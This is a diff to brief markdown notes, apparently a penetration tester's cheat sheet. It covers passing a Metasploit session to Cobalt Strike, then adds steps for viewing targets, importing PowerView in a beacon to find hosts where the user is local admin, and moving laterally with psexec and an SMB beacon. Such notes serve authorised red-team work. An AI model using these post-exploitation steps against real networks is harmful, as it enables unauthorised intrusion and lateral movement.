@@ -1,4 +1,4 @@
-Cobalt Strike
+# Cobalt Strike
 
 Move a meterpreter / metasploit session to Cobalt
 
@@ -14,6 +14,25 @@ set LPORT 80
 set session 1
 set DisablePayloadHandler true
 exploit (-j)
+```
+
+View targets available from Initial Target
+
+```
+Right Click Target --> Explore -->Net View
+```
+
+Find where we are a local admin
+
+```
+beacon: powershell-import /root/PowerTools/PowerView/powerview.ps1
+beacon:Invoke-FindLocalAdminAccess
+```
+
+Login to target where we are local admin
+
+```
+Right Click Target -->Login -->psexec (change Listener to SMB beacon)(choose a session)(user session's current token)
 ```
 
 
